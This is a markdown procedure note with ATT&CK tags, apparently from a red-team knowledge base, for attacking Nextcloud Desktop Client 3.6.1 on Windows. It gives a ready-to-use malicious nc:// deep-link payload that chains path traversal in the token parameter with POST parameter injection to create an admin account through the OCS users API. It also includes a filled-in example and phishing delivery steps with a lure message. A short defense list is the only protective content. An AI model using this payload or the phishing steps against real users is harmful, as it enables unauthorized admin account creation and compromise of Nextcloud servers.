---
id: proc-uuid-1
tags:
  - csrf
  - deep-link
  - path-traversal
  - parameter-injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/construct-nextcloud-deeplink]]'
verified: false
platforms:
  - Windows
  - Desktop Application
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:27:43.060Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploitation for Client Execution]]'
---
# Craft-and-Deliver-Malicious-Nextcloud-Deep-Link

## Summary

This procedure crafts a malicious deep link exploiting CSRF in Nextcloud Desktop Client 3.6.1 on Windows, using path traversal in the token parameter and parameter injection in the POST body to redirect requests to arbitrary endpoints like user creation APIs.

## Description

The Nextcloud Desktop Client handles deeplinks via `folderman.cpp` and the `openlocaleditor` API, where the token is concatenated without URL encoding, allowing traversal (e.g., `?token=../../../../../../../ocs/v1.php/cloud/users`). The relative path (`relPath`) is appended to the POST body without encoding, enabling injection of parameters like `userid` and `groups`. Delivery via email or chat tricks the victim into clicking, executing the request in their authenticated context. Prerequisites include knowing the victim's instance URL and username; no tools needed beyond a text editor for link construction.

## Requirements

1. Windows machine for testing (victim's environment)
2. Installed Nextcloud Desktop Client 3.6.1
3. Knowledge of target Nextcloud server URL and victim username
4. Delivery channel (email/chat) to victim

## Defense

Defensive measures and detection strategies:

- Update to Nextcloud Desktop Client >3.6.1 to patch encoding issues
- Disable deep link handling or use browser-based clients
- Monitor OCS API logs for unexpected POST requests from desktop IPs
- Educate users on suspicious links

## Objectives

1. Trigger arbitrary POST to server-side endpoints
2. Inject parameters for unauthorized actions like user creation
3. Gain initial access via victim authentication context

## Instructions

### Step 1: Construct the Malicious Deeplink

**Context**: Build the deeplink exploiting path traversal in token and injection in relPath to target the user creation endpoint.

**Command** ([[commands/construct-nextcloud-deeplink]]):

Use a text editor or script to generate:

```plaintext
nc://open/{victim-username}@{instance-url}/.\&userid={new-user}&password={pass}&displayName={name}&email={email}&groups[]=admin&\..\.owncloudsync.log?token=../../../../../../../ocs/v1.php/cloud/users
```

> Replace placeholders: e.g., `nc://open/admin@pentest.cloud.wtf/.\&userid=hacker&password=h4ck3rPassw0Rd!&displayName=hacker&email=mail@example.com&groups[]=admin&\..\.owncloudsync.log?token=../../../../../../../ocs/v1.php/cloud/users`. This traverses to `/ocs/v1.php/cloud/users` and injects POST params.

### Step 2: Deliver the Link to Victim

**Context**: Send the link via phishing to induce click, triggering client execution.

Embed in email or chat message, e.g., "Click to sync your Nextcloud files: [link]".

> No command needed; use email client or messaging app. Expected: Victim clicks, client opens, POST sent silently.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise
- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques

-

## Commands Used

- [[commands/construct-nextcloud-deeplink]]

## Tools Used

-

## Tags

- csrf
- nextcloud
- deep-link
